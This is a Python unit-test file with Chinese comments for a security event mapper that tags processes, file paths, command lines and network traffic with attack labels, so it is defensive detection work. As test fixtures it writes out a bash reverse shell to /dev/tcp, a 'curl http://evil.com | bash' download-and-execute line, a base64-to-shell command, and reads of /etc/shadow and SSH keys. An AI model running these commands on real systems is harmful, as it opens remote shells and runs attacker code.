# tests/test_atlas_mapper_full.py
import unittest
import sys
import os

# 确保能导入 analyzer 模块
sys.path.append(os.getcwd())

from analyzer.graph_analyzer.atlas_mapper import AtlasMapper

class TestAtlasMapperFull(unittest.TestCase):
    def setUp(self):
        self.mapper = AtlasMapper()
        print(f"\n[{self._testMethodName}] 测试开始...")

    # ==========================================
    # 1. 测试组员1 (主机采集) 数据映射
    # ==========================================

    def test_host_process_commands(self):
        """测试主机进程命令映射 (组员1)"""
        test_cases = [
            # (描述, 事件数据, 预期标签)
            ("网络侦察工具", {"process": {"executable": "/usr/bin/nmap"}}, "NETWORK_SCANNER"),
            ("系统侦察命令", {"process": {"executable": "/usr/bin/id"}}, "RECON_COMMAND"),
            ("下载工具(Curl)", {"process": {"executable": "/usr/bin/curl"}}, "SUSPICIOUS_DOWNLOADER"),
            ("数据传输(Netcat)", {"process": {"executable": "/bin/nc"}}, "DATA_TRANSFER_TOOL"),
            ("Shell执行", {"process": {"executable": "/bin/bash"}}, "SHELL_EXECUTION"),
            ("提权工具", {"process": {"executable": "/usr/bin/sudo"}}, "PRIVILEGE_ESCALATION"),
            ("持久化(Crontab)", {"process": {"executable": "/usr/bin/crontab"}}, "PERSISTENCE_MECHANISM"),
            ("编译工具", {"process": {"executable": "/usr/bin/gcc"}}, "COMPILATION_TOOL"),
            ("压缩工具", {"process": {"executable": "/usr/bin/tar"}}, "ARCHIVE_TOOL"),
            ("普通进程(Unknown)", {"process": {"executable": "/usr/bin/ls"}}, "UNKNOWN"), 
        ]

        for desc, event, expected in test_cases:
            # 补全必要字段防止报错
            event.setdefault('event', {'category': 'process'})
            label = self.mapper.get_label(event)
            print(f"   Testing {desc}: {event['process']['executable']} -> {label}")
            if expected != "UNKNOWN":
                self.assertEqual(label, expected, f"{desc} 映射失败")

    def test_host_file_paths(self):
        """测试主机文件路径映射 (组员1)"""
        test_cases = [
            ("临时文件", {"file": {"path": "/tmp/malware.sh"}}, "TEMP_FILE_ACCESS"),
            ("Web根目录", {"file": {"path": "/var/www/html/index.php"}}, "WEB_ROOT_ACCESS"),
            
            # [关键修复] 修正测试数据结构，使用嵌套字典
            ("WebShell脚本", {"file": {"path": "/var/www/shell.jsp", "extension": "jsp"}}, "WEB_ROOT_ACCESS"), 
            
            ("敏感文件(Passwd)", {"file": {"path": "/etc/passwd"}}, "SENSITIVE_FILE"),
            ("敏感文件(Shadow)", {"file": {"path": "/etc/shadow"}}, "SENSITIVE_FILE"),
            
            # [关键验证] 移除高优先级列表后，这里应映射为具体的 SSH_RELATED
            ("SSH密钥", {"file": {"path": "/home/user/.ssh/id_rsa"}}, "SSH_RELATED"),
            
            # 同理，Bash历史
            ("Bash历史", {"file": {"path": "/home/user/.bash_history"}}, "HISTORY_FILE"),
        ]

        for desc, event, expected in test_cases:
            event.setdefault('event', {'category': 'file'})
            label = self.mapper.get_label(event)
            print(f"   Testing {desc}: {event['file']['path']} -> {label}")
            self.assertEqual(label, expected, f"{desc} 映射失败")

    def test_host_cmdline_heuristics(self):
        """测试命令行特征 (反弹Shell等)"""
        test_cases = [
            ("反弹Shell (bash -i)", 
             {"process": {"command_line": "bash -i >& /dev/tcp/1.1.1.1/8080 0>&1"}}, 
             "REVERSE_SHELL"),
            ("管道执行 (curl | bash)", 
             {"process": {"command_line": "curl http://evil.com | bash"}}, 
             "DOWNLOAD_AND_EXECUTE"), # 之前失败，现在应通过
            ("Base64解码", 
             {"process": {"command_line": "echo 'xx' | base64 -d | sh"}}, 
             "ENCODED_EXECUTION"),
        ]

        for desc, event, expected in test_cases:
            event.setdefault('event', {'category': 'process'})
            label = self.mapper.get_label(event)
            print(f"   Testing {desc} -> {label}")
            self.assertEqual(label, expected, f"{desc} 映射失败")

    # ==========================================
    # 2. 测试组员2 (网络采集) 数据映射
    # ==========================================

    def test_network_traffic(self):
        """测试 Zeek/Cowrie 网络流量映射 (组员2)"""
        test_cases = [
            ("入站流量", 
             {"event": {"category": "network"}, "network": {"direction": "inbound"}}, 
             "NETWORK_Inbound"),
            ("出站流量", 
             {"event": {"category": "network"}, "network": {"direction": "outbound"}}, 
             "NETWORK_Outbound"),
            ("DNS协议", 
             {"event": {"category": "network"}, "network": {"protocol": "dns"}}, 
             "DNS_QUERY"),
            ("SSH连接", 
             {"event": {"category": "network"}, "network": {"protocol": "ssh"}}, 
             "SSH_CONNECTION"),
        ]

        for desc, event, expected in test_cases:
            label = self.mapper.get_label(event)
            print(f"   Testing {desc} -> {label}")
            self.assertEqual(label, expected, f"{desc} 映射失败")

    def test_web_shell_detection(self):
        """测试 WebShell 特殊规则 (Action + Ext)"""
        event = {
            "event": {"category": "file", "action": "write"},
            "file": {
                "path": "/var/www/html/shell.php",
                "extension": "php"
            }
        }
        label = self.mapper.get_label(event)
        print(f"   Testing WebShell Write -> {label}")
        self.assertIn(label, ["PHP_SCRIPT", "WEB_ROOT_ACCESS"])

    def test_priority_logic(self):
        """测试规则优先级 (敏感文件 > 普通进程)"""
        event = {
            "event": {"category": "process"},
            "process": {
                "executable": "/usr/bin/cat",
                "command_line": "cat /etc/shadow"
            },
            "file": {
                "path": "/etc/shadow"
            }
        }
        label = self.mapper.get_label(event)
        print(f"   Testing Priority (cat /etc/shadow) -> {label}")
        self.assertEqual(label, "SENSITIVE_FILE")

if __name__ == '__main__':
    unittest.main()
